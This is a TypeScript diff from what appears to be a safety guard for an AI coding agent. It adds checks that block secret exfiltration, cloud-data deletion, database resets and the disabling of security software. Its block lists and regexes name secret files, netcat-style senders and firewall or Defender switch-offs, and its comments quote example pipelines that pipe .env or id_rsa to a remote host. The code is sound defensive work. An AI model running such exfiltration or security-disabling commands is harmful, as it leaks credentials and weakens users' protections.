@@ -170,6 +170,8 @@ function checkDelete(t: Target, recursive: boolean, s: Scope): void {
   }
   const crit = hitsCritical(t.path, paths, ctx.platform);
   if (crit) {
+    const own = ownProtection(t.path, crit, s);
+    if (own) return add(s, own.rule, own.key, { target: show(t.path) });
     const isMemory = under(crit, paths.memoryDirs, ctx.platform);
     const itself = pathKey(t.path, ctx.platform) === pathKey(crit, ctx.platform);
     add(s, isMemory ? 'self.memory-delete' : 'fs.delete-critical', itself ? 'belt.reason.deleteProtected' : 'belt.reason.deleteCritical', {
@@ -221,7 +223,25 @@ function insideAProject(path: string, project: string, ctx: BeltContext, paths: 
 function checkMove(t: Target, s: Scope): void {
   if (t.path === null) return;
   const crit = hitsCritical(t.path, s.paths, s.ctx.platform);
-  if (crit) add(s, 'fs.move-critical', 'belt.reason.moveCritical', { target: show(t.path), critical: show(crit) });
+  if (!crit) return;
+  const own = ownProtection(t.path, crit, s);
+  if (own) add(s, own.rule, own.key, { target: show(t.path) });
+  else add(s, 'fs.move-critical', 'belt.reason.moveCritical', { target: show(t.path), critical: show(crit) });
+}
+
+/**
+ * Deleting or moving the tool's own folder or Claude Code's configuration (the folder itself, not
+ * something that merely contains it, such as the home folder) is self-protection, not a critical
+ * folder: bypass never opens it.
+ */
+function ownProtection(target: string, crit: string, s: Scope): { rule: RuleId; key: MessageKey } | null {
+  const { ctx, paths } = s;
+  if (pathKey(target, ctx.platform) !== pathKey(crit, ctx.platform)) return null;
+  if (under(crit, paths.toolDirs, ctx.platform)) return { rule: 'self.tool-files', key: 'belt.reason.toolFiles' };
+  const cdir = paths.canonical(claudeDir(ctx));
+  if (pathKey(crit, ctx.platform) === pathKey(cdir, ctx.platform) || under(crit, paths.claudeConfig, ctx.platform))
+    return { rule: 'self.claude-settings', key: 'belt.reason.claudeConfig' };
+  return null;
 }
 
 /** truncate (>), append (>>), replace (cp, Set-Content), edit (sed -i, Edit tool), tool-write (Write tool: memory measured by the caller). */
@@ -585,6 +605,10 @@ async function checkInvocation(inv: Invocation, cwd: string | null, s0: Scope, d
       if (/^mkfs(\.|$)/.test(p) || /^newfs/.test(p)) add(s, 'fs.disk', 'belt.reason.disk', { command: show(inv.raw) });
       else checkPublish(p, ws, inv.raw, s);
   }
+  checkData(inv, s);
+  checkSecurityOff(inv, dialect, s);
+  checkExfil(inv, ws, s);
+  if (p === 'gh') checkGitHub(inv, s);
 
   if (inv.inlineCode) await checkInlineCode(inv, cwd, s);
 }
@@ -741,7 +765,32 @@ async function checkGit(inv: Invocation, ws: Word[], cwd: string | null, s: Scop
 }
 
 const SECRET_FILE =
-  /^(?:\.env(?:\..+)?|.*\.(?:pem|key|p12|pfx|jks|keystore|ppk|asc)|id_(?:rsa|dsa|ecdsa|ed25519)(?:\.pub)?|credentials(?:\.json)?|service-account.*\.json|\.npmrc|\.pypirc|\.netrc|\.git-credentials|secrets?\.(?:json|ya?ml|toml))$/i;
+  /^(?:\.env(?:\..+)?|\.dev\.vars|.*\.(?:pem|key|p12|pfx|jks|keystore|ppk|asc)|id_(?:rsa|dsa|ecdsa|ed25519)(?:\.pub)?|\.?credentials(?:\.json)?|service-account.*\.json|key\.properties|\.npmrc|\.pypirc|\.netrc|\.git-credentials|secrets?\.(?:json|ya?ml|toml))$/i;
+
+/**
+ * A file whose content is a secret: what SECRET_FILE names, less what only looks like one (a template of
+ * .env, a public key, an ASCII-armoured key or signature that is usually public). Sending one of these out
+ * is blocked without a way around, so the list stays to what is surely secret.
+ */
+function secretFile(path: string): boolean {
+  const name =
+    path
+      .replace(/[;,].*$/, '')
+      .split(/[\\/]/)
+      .pop() ?? '';
+  return SECRET_FILE.test(name) && !/\.(?:example|sample|template|dist|pub|asc)$/i.test(name);
+}
+
+/** The high-confidence secrets in a text sent out (their kinds), for secrets.exfil. */
+function secretKinds(text: string): string[] {
+  return [
+    ...new Set(
+      scanSecrets(text)
+        .filter((m) => m.confidence === 'high')
+        .map((m) => m.kind),
+    ),
+  ];
+}
 
 function checkClaude(ws: Word[], s: Scope): void {
   const a = ws.map((w) => w.text);
@@ -845,6 +894,427 @@ function checkPublish(p: string, ws: Word[], raw: string, s: Scope): void {
   if (p === 'gcloud' && a.includes('deploy')) return dep();
 }
 
+// ── data, security software, secrets leaving, GitHub, connected services ─────────────────────────────
+
+/** Words of a call, lower case, without options: `gcloud sql instances delete x --quiet` → gcloud's words. */
+function plainWords(inv: Invocation): string[] {
+  return inv.args.filter((x) => !x.startsWith('-')).map((x) => x.toLowerCase());
+}
+
+/** The value of an option: `-c x`, `-cx`, `--command x`, `--command=x`; every occurrence. */
+function optionValues(args: readonly string[], shorts: readonly string[], longs: readonly string[]): string[] {
+  const out: string[] = [];
+  for (let i = 0; i < args.length; i++) {
+    const a = args[i]!;
+    // A next word that is itself an option is not this one's value (`psql -e -c …`: -e takes none).
+    const next = args[i + 1];
+    const value = next !== undefined && !(next.startsWith('-') && next.length > 1);
+    const long = longs.find((l) => a === l || a.startsWith(`${l}=`));
+    if (long) {
+      if (a.length > long.length) out.push(a.slice(long.length + 1));
+      else if (value) out.push(args[++i]!);
+      continue;
+    }
+    const short = shorts.find((x) => a === x || (a.startsWith(x) && !a.startsWith('--') && x.length === 2));
+    if (short) {
+      if (a.length > short.length) out.push(a.slice(short.length));
+      else if (value) out.push(args[++i]!);
+    }
+  }
+  return out;
+}
+
+const DROP_SQL = /\b(?:drop\s+(?:database|schema|table)|truncate(?:\s+table)?\s+\w)/i;
+const DROP_MONGO = /\bdropDatabase\s*\(|\.drop\s*\(\s*\)|\.deleteMany\s*\(\s*\{\s*\}\s*\)/;
+/** gcloud and az groups that hold data: deleting in them deletes data in the cloud. */
+const CLOUD_DATA_GROUPS = new Set([
+  'sql',
+  'firestore',
+  'storage',
+  'spanner',
+  'bigtable',
+  'redis',
+  'filestore',
+  'alloydb',
+  'projects',
+  'buckets',
+  'databases',
+  'cosmosdb',
+  'group',
+  'postgres',
+  'mysql',
+  'keyvault',
+]);
+/** aws services that hold data, whose delete-* calls delete it. */
+const AWS_DATA = new Set(['s3api', 'rds', 'dynamodb', 'docdb', 'neptune', 'redshift', 'elasticache', 'efs', 'glacier', 'keyspaces', 'opensearch', 'es']);
+
+/**
+ * Data that lives elsewhere: in the cloud (Firebase, buckets, managed databases, a GitHub repository) it is
+ * blocked to delete and asked to overwrite; a database reset whose target the command does not show (a
+ * local development database as often as a live one) is asked about.
+ */
+function checkData(inv: Invocation, s: Scope): void {
+  const p = inv.program;
+  const a = inv.args.map((x) => x.toLowerCase());
+  const w = plainWords(inv);
+  const raw = show(inv.raw);
+  const cloud = () => add(s, 'data.delete-cloud', 'belt.reason.deleteCloud', { command: raw });
+  const reset = () => add(s, 'data.reset-database', 'belt.reason.resetDatabase', { command: raw });
+  switch (p) {
+    case 'firebase': {
+      const sub = w[0] ?? '';
+      const emulated = !!(s.ctx.env.FIREBASE_DATABASE_EMULATOR_HOST || s.ctx.env.FIRESTORE_EMULATOR_HOST);
+      if (emulated) return;
+      if (sub === 'firestore:delete' || sub === 'database:remove' || sub === 'firestore:databases:delete') return cloud();
+      if (/^database:(?:set|update|push)$/.test(sub)) return void add(s, 'data.write-cloud', 'belt.reason.writeCloud', { command: raw });
+      return;
+    }
+    case 'gsutil':
+      if ((w.includes('rm') && a.some((x) => /^-[a-z]*[rR][a-z]*$/i.test(x) || x === '--recursive')) || w.includes('rb')) cloud();
+      return;
+    case 'gcloud':
+    case 'az': {
+      const del = w.findLast((x) => /^delete(?:-batch)?$/.test(x));
+      // One blob or object is a file, not a store: `az storage blob delete` stays a file deletion.
+      const single = w[0] === 'storage' && (w[1] === 'blob' || w[1] === 'objects') && del === 'delete';
+      if (del && !single && w.slice(0, w.lastIndexOf(del)).some((x) => CLOUD_DATA_GROUPS.has(x))) return cloud();
+      if (p === 'gcloud' && w[0] === 'storage' && w[1] === 'rm' && a.some((x) => x === '-r' || x === '--recursive')) cloud();
+      return;
+    }
+    case 'aws': {
+      if (w[0] === 's3' && ((w[1] === 'rm' && a.includes('--recursive')) || w[1] === 'rb' || (w[1] === 'sync' && a.includes('--delete')))) return cloud();
+      if (AWS_DATA.has(w[0] ?? '') && /^delete-/.test(w[1] ?? '')) cloud();
+      return;
+    }
+    case 'wrangler':
+      if (
+        (w[0] === 'kv' && w[1] === 'namespace' && w[2] === 'delete') ||
+        (w[0] === 'kv:namespace' && w[1] === 'delete') ||
+        (w[0] === 'r2' && w[1] === 'bucket' && w[2] === 'delete') ||
+        (w[0] === 'd1' && w[1] === 'delete')
+      )
+        cloud();
+      return;
+    case 'supabase':
+      if (w[0] === 'projects' && w[1] === 'delete') return cloud();
+      if (w[0] === 'db' && w[1] === 'reset') return a.some((x) => x === '--linked' || x.startsWith('--db-url')) ? cloud() : reset();
+      return;
+    case 'prisma':
+      if ((w[0] === 'migrate' && w[1] === 'reset') || (w[0] === 'db' && w[1] === 'push' && a.some((x) => x === '--force-reset' || x === '--accept-data-loss')))
+        reset();
+      return;
+    case 'redis-cli':
+      if (a.some((x) => x === 'flushall' || x === 'flushdb')) reset();
+      return;
+    case 'dropdb':
+      return reset();
+    case 'mysqladmin':
+      if (w.includes('drop')) reset();
+      return;
+    case 'psql':
+    case 'mysql':
+    case 'mariadb':
+    case 'sqlcmd':
+      if (optionValues(inv.args, ['-c', '-e', '-Q', '-q'], ['--command', '--execute']).some((x) => DROP_SQL.test(x))) reset();
+      return;
+    case 'mongosh':
+    case 'mongo':
+      if (optionValues(inv.args, [], ['--eval']).some((x) => DROP_MONGO.test(x) || DROP_SQL.test(x))) reset();
+      return;
+    case 'rails':
+    case 'rake':
+      if (w.some((x) => /^db:(?:drop|reset|truncate_all|schema:load)(?::|$)/.test(x))) reset();
+      return;
+    case 'php':
+      if (w[0] === 'artisan' && /^(?:migrate:fresh|migrate:reset|db:wipe)$/.test(w[1] ?? '')) reset();
+      return;
+    case 'python':
+    case 'python3':
+    case 'py':
+      if (/(?:^|[\\/])manage\.py$/.test(w[0] ?? '') && w[1] === 'flush') reset();
+      return;
+    case 'django-admin':
+      if (w[0] === 'flush') reset();
+      return;
+  }
+}
+
+/** Windows services of the security software: Defender, its firewall, the security center. */
+const SECURITY_SERVICE = /^(?:windefend|wdnissvc|wdfilter|wdboot|sense|mpssvc|wscsvc|securityhealthservice|mdcoresvc)$/i;
+/** Registry places of Defender, the security center and the account control prompt. */
+const SECURITY_KEY = /windows defender|\\?windefend\b|securityhealth|\benablelua\b|\bconsentpromptbehavioradmin\b|\\?wscsvc\b/i;
+/** Linux and macOS services that guard the machine. */
+const SECURITY_UNIT = /^(?:firewalld|ufw|nftables|iptables|apparmor|auditd|clamav-daemon|clamav-freshclam|clamd)(?:\.service)?$/i;
+
+/** Turning security software off: blocked without bypass, asked with it. */
+function checkSecurityOff(inv: Invocation, dialect: Dialect, s: Scope): void {
+  const p = inv.program;
+  const a = inv.args;
+  const lower = a.map((x) => x.toLowerCase());
+  const off = () => add(s, 'system.security-off', 'belt.reason.securityOff', { command: show(inv.raw) });
+  const falsy = (v: string | undefined) => v !== undefined && /^(?:\$?false|0)$/i.test(v);
+  switch (p) {
+    case 'set-mppreference':
+    case 'add-mppreference':
+      for (let i = 0; i < a.length; i++) {
+        const [name, inline] = splitParam(a[i]!);
+        if (!a[i]!.startsWith('-')) continue;
+        if (/^exclusion/.test(name)) return off();
+        if (p === 'set-mppreference' && /^disable/.test(name) && !falsy(inline ?? (a[i + 1]?.startsWith('-') ? undefined : a[i + 1]))) return off();
+      }
+      return;
+    case 'uninstall-windowsfeature':
+    case 'remove-windowsfeature':
+    case 'disable-windowsoptionalfeature':
+      if (lower.some((x) => x.includes('defender'))) off();
+      return;
+    case 'set-netfirewallprofile':
+      for (let i = 0; i < a.length; i++) {
+        const [name, inline] = splitParam(a[i]!);
+        if (a[i]!.startsWith('-') && 'enabled'.startsWith(name) && name.length >= 2 && falsy(inline ?? a[i + 1])) return off();
+      }
+      return;
+    case 'netsh': {
+      const line = lower.join(' ');
+      if (/\badvfirewall\s+set\s+\S+\s+state\s+off\b/.test(line) || /\bfirewall\s+set\s+opmode\s+(?:mode=)?disable/.test(line)) off();
+      return;
+    }
+    case 'sc':
+      if (dialect !== 'powershell' && /^(?:stop|delete|config)$/.test(lower[0] ?? '') && SECURITY_SERVICE.test(lower[1] ?? '')) {
+        if (lower[0] !== 'config' || lower.some((x) => x.includes('disabled'))) off();
+      }
+      return;
+    case 'net':
+      if (lower[0] === 'stop' && SECURITY_SERVICE.test(lower[1] ?? '')) off();
+      return;
+    case 'stop-service':
+    case 'set-service':
+      if (lower.some((x) => SECURITY_SERVICE.test(x)) && (p === 'stop-service' || lower.some((x) => x === 'disabled' || x === 'stopped'))) off();
+      return;
+    case 'reg':
+      if (/^(?:add|delete|import)$/.test(lower[0] ?? '') && a.some((x) => SECURITY_KEY.test(x))) off();
+      return;
+    case 'set-itemproperty':
+    case 'new-itemproperty':
+    case 'remove-itemproperty':
+      if (a.some((x) => SECURITY_KEY.test(x))) off();
+      return;
+    case 'spctl':
+      if (lower.includes('--master-disable') || lower.includes('--global-disable')) off();
+      return;
+    case 'socketfilterfw':
+      if (lower.join(' ').includes('--setglobalstate off')) off();
+      return;
+    case 'csrutil':
+      if (lower[0] === 'disable') off();
+      return;
+    case 'ufw':
+      if (lower[0] === 'disable') off();
+      return;
+    case 'systemctl':
+      if (/^(?:stop|disable|mask|kill)$/.test(lower.find((x) => !x.startsWith('-')) ?? '') && lower.some((x) => SECURITY_UNIT.test(x))) off();
+      return;
+    case 'setenforce':
+      if (/^(?:0|permissive)$/.test(lower[0] ?? '')) off();
+      return;
+    case 'iptables':
+    case 'ip6tables':
+      if (lower.some((x) => x === '-f' || x === '--flush')) off();
+      return;
+    case 'nft':
+      if (lower[0] === 'flush' && lower[1] === 'ruleset') off();
+      return;
+  }
+}
+
+/** A remote destination of scp, rsync and the like: host:path, user@host:path, a URL; not a drive letter. */
+function remoteTarget(x: string): boolean {
+  if (/^[A-Za-z]:[\\/]/.test(x)) return false;
+  return /^(?:[\w.-]+@)?[\w.-]+:/.test(x) || /^(?:rsync|sftp|scp|ftp|https?):\/\//i.test(x);
+}
+
+/**
+ * A secret leaving the machine: a key or credential file uploaded, or a secret written into what is sent
+ * (a request body, a form, a gist). Blocked always, bypass included: the person sends it themselves if it
+ * must go. Authentication to the service itself (a header, a client certificate, an ssh key) is not sending.
+ */
+function checkExfil(inv: Invocation, ws: Word[], s: Scope): void {
+  const p = inv.program;
+  const a = inv.args;
+  const leak = (what: string) => add(s, 'secrets.exfil', 'belt.reason.exfil', { what: show(what) });
+  const files: string[] = [];
+  const bodies: string[] = [];
+  switch (p) {
+    case 'curl':
+      for (const v of optionValues(a, ['-d'], ['--data', '--data-binary', '--data-urlencode', '--json'])) {
+        const at = /^(?:[^=@]*=)?@(.+)$/.exec(v);
+        if (at) files.push(at[1]!);
+        else bodies.push(v);
+      }
+      bodies.push(...optionValues(a, [], ['--data-raw']));
+      for (const v of optionValues(a, ['-F'], ['--form', '--form-string'])) {
+        const f = /=[@<]([^;]+)/.exec(v);
+        if (f) files.push(f[1]!);
+        else bodies.push(v);
+      }
+      files.push(...optionValues(a, ['-T'], ['--upload-file']));
+      break;
+    case 'wget':
+      files.push(...optionValues(a, [], ['--post-file', '--body-file']));
+      bodies.push(...optionValues(a, [], ['--post-data', '--body-data']));
+      break;
+    case 'invoke-webrequest':
+    case 'invoke-restmethod': {
+      const named = psNamed(ws, { infile: 'InFile', body: 'Body' }, []);
+      if (named.infile) files.push(named.infile.text);
+      if (named.body) bodies.push(named.body.text);
+      break;
+    }
+    case 'scp':
+    case 'pscp':
+    case 'rsync': {
+      const withValue = new Set(['-i', '-P', '-o', '-F', '-c', '-l', '-S', '-J', '-e', '--rsh', '--exclude', '--include', '--filter', '-pw']);
+      const pos = positional(ws, withValue).map((w) => w.text);
+      if (pos.length >= 2 && remoteTarget(pos[pos.length - 1]!)) files.push(...pos.slice(0, -1).filter((x) => !remoteTarget(x)));
+      break;
+    }
+    case 'gh': {
+      const w = plainWords(inv);
+      if (w[0] === 'gist' && w[1] === 'create')
+        files.push(
+          ...positional(ws, new Set(['-d', '--desc', '-f', '--filename']))
+            .slice(2)
+            .map((x) => x.text),
+        );
+      if (w[0] === 'release' && w[1] === 'upload')
+        files.push(
+          ...positional(ws)
+            .slice(3)
+            .map((x) => x.text.replace(/#.*$/, '')),
+        );
+      break;
+    }
+    default:
+      return;
+  }
+  for (const f of files) if (secretFile(f)) return leak(f);
+  for (const b of bodies) {
+    const kinds = secretKinds(b);
+    if (kinds.length) return leak(kinds.join(', '));
+  }
+}
+
+/** Programs that print or pack a file's content: what they read can be piped onwards. */
+const SECRET_READERS = new Set([
+  'cat',
+  'tac',
+  'type',
+  'get-content',
+  'head',
+  'tail',
+  'more',
+  'less',
+  'base64',
+  'xxd',
+  'od',
+  'hexdump',
+  'strings',
+  'gzip',
+  'bzip2',
+  'xz',
+  'zip',
+  'tar',
+  '7z',
+  'openssl',
+  'gpg',
+  'jq',
+  'yq',
+  'sed',
+  'awk',
+  'gawk',
+  'cut',
+  'sort',
+  'grep',
+  'rg',
+  'findstr',
+  'select-string',
+  'certutil',
+]);
+
+/**
+ * A secret read by one program and sent by the next through a pipe: `cat .env | curl --data-binary @- …`,
+ * `type id_rsa | nc host 9000`. The belt reads one call at a time, so the pair is judged on the whole command.
+ */
+function checkPipedSecret(invs: readonly Invocation[], s: Scope): void {
+  const stdinSender = (inv: Invocation): boolean => {
+    const a = inv.args;
+    if (/^(?:nc|ncat|netcat|socat|telnet)$/.test(inv.program)) return !a.some((x) => /^-[a-z]*z/.test(x)); // -z only probes a port
+    if (inv.program === 'curl')
+      return optionValues(a, ['-d', '-T', '-F'], ['--data', '--data-binary', '--data-urlencode', '--data-raw', '--json', '--upload-file', '--form']).some(
+        (v) => v === '@-' || v === '-' || v === '.' || /=[@<]-$/.test(v),
+      );
+    if (inv.program === 'wget') return optionValues(a, [], ['--post-file', '--body-file']).some((v) => v === '-' || v === '/dev/stdin');
+    return false;
+  };
+  const senders = invs.filter(stdinSender);
+  if (!senders.length) return;
+  for (const inv of invs) {
+    if (senders.includes(inv) || !SECRET_READERS.has(inv.program)) continue;
+    const f = inv.args.find((x) => !x.startsWith('-') && secretFile(x));
+    if (f) return add(s, 'secrets.exfil', 'belt.reason.exfil', { what: show(f) });
+  }
+  for (const inv of senders) {
+    const m = /<\s*("[^"]+"|'[^']+'|\S+)/.exec(inv.raw);
+    if (m && secretFile(m[1]!.replace(/^["']|["']$/g, ''))) return add(s, 'secrets.exfil', 'belt.reason.exfil', { what: show(m[1]!) });
+  }
+}
+
+/** GitHub through its command line: merging past the required checks, deleting what lives there. */
+function checkGitHub(inv: Invocation, s: Scope): void {
+  const w = plainWords(inv);
+  const a = inv.args.map((x) => x.toLowerCase());
+  const raw = show(inv.raw);
+  if (w[0] === 'pr' && w[1] === 'merge' && a.includes('--admin')) add(s, 'github.admin-merge', 'belt.reason.adminMerge', { command: raw });
+  if (w[0] === 'repo' && w[1] === 'delete') return add(s, 'data.delete-cloud', 'belt.reason.deleteCloud', { command: raw });
+  const deletes =
+    (w[0] === 'repo' && w[1] === 'archive') ||
+    (['release', 'secret', 'variable', 'label', 'gist'].includes(w[0] ?? '') && /^(?:delete|delete-asset|remove)$/.test(w[1] ?? '')) ||
+    (w[0] === 'api' && optionValues(inv.args, ['-X'], ['--method']).some((m) => m.toUpperCase() === 'DELETE'));
+  if (deletes) add(s, 'github.delete', 'belt.reason.githubDelete', { command: raw });
+}
+
+/** Verbs of a connected service's tool that reach other people. */
+const OUT_SEND = new Set(['send', 'reply', 'forward', 'share', 'invite', 'respond', 'post', 'publish']);
+const OUT_DELETE = new Set(['delete', 'trash', 'remove', 'destroy', 'purge', 'wipe']);
+/** Verbs that write something to the service: a secret in what they carry leaves the machine. */
+const OUT_WRITE =
+  /(?:^|_)(?:send|reply|forward|share|post|publish|create|update|write|upload|insert|append|set|put|add|edit|comment|batch|draft|save|import|copy)(?:_|$)/;
+
+/**
+ * A connected service's tool (MCP: mail, calendars, drives …). Sending, sharing and calendar events reach
+ * other people and cannot be taken back: asked. Deleting there is asked too. A secret in what such a tool
+ * carries leaves the machine: blocked.
+ */
+export function checkOutward(tool: string, input: Readonly<Record<string, unknown>>, ctx: BeltContext): Finding[] {
+  const s: Scope = { ctx, paths: protectedPaths(ctx), findings: [], inline: false };
+  const action = (tool.split('__').pop() ?? '').toLowerCase();
+  const verbs = action.split(/[_-]+/).filter(Boolean);
+  const event = verbs.includes('event') && verbs.some((v) => v === 'create' || v === 'update' || v === 'delete');
+  if (event || verbs.some((v) => OUT_SEND.has(v))) add(s, 'outbound.send', 'belt.reason.outboundSend', { tool });
+  else if (verbs.some((v) => OUT_DELETE.has(v))) add(s, 'outbound.delete', 'belt.reason.outboundDelete', { tool });
+  if (OUT_WRITE.test(action)) {
+    let text = '';
+    try {
+      text = JSON.stringify(input);
+    } catch {
+      text = '';
+    }
+    const kinds = secretKinds(text);
+    if (kinds.length) add(s, 'secrets.exfil', 'belt.reason.exfil', { what: kinds.join(', ') });
+  }
+  return s.findings;
+}
+
 /** Best effort for code passed to interpreters (node -e, python -c): string literals that are commands or protected paths. */
 async function checkInlineCode(inv: Invocation, cwd: string | null, s: Scope): Promise<void> {
   const code = inv.inlineCode ?? '';
@@ -931,6 +1401,7 @@ async function evaluateScript(command: string, dialect: Dialect, s: Scope, start
     await checkInvocation(inv, cwd, s, inv.dialect);
   }
   checkDisableHooks(command, analysis.invocations, s);
+  checkPipedSecret(analysis.invocations, s);
   const strong = analysis.issues.filter((i) => STRONG_UNCERTAIN.has(i));
   const weak = RISKY_SIGNAL.test(command) ? analysis.issues.filter((i) => WEAK_UNCERTAIN.has(i)) : [];
   const dynamic = analysis.invocations.some((inv) => inv.programDynamic && DYNAMIC_PROGRAM_RISK.test(inv.args.join(' '))) ? ['dynamic-program'] : [];
